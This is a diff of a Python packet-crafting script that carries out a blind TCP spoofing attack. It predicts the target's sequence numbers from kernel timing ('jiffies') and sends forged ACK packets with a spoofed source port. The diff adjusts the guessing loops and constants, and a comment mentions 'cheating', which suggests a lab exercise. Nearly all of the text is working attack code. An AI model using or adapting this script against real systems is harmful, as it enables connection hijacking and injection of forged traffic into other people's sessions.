@@ -79,19 +79,20 @@ print(spoof_seq)
 #sleep(.0001)
 
 
-for num in range(-3, 3):
-    nano_weight = 62500  #the amount we expect each read to differ for a change by 1 jiffie
+for num in range(0, 2):
+    print ("Loop iteration " + str(num))
+    nano_weight = 62503.90625  #the amount we expect each read to differ for a change by 1 jiffie
 
 #ORIGINAL, commented out for cheating
-#    for num2 in range(0, (2 * 1000)): #calibrate this
-#        ackie = spoof_seq + ((num + average) * nano_weight) + num2
+    for num2 in range(0, 2): #calibrate this
+        ackie = spoof_seq + (int((num + average) * nano_weight)) + num2
 #        print("Num jiffies off: " + str(num + average) + "Seq num: " + str(ackie))
 #        outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=ackie)
 #        packet = outbound_ip/outbound_tcp_ack/"Boosh!"
 #        send(packet)
 
-    for num2 in range(0, (100)): #calibrate this
-        ackie = spoof_seq + 1187500 + num2
+ #   for num2 in range(0, (100)): #calibrate this
+  #      ackie = spoof_seq + 1187500 + num2
         print("Num jiffies off: " + str(num + average) + "Seq num: " + str(ackie))
         outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=ackie)
         packet = outbound_ip/outbound_tcp_ack/"Boosh!"
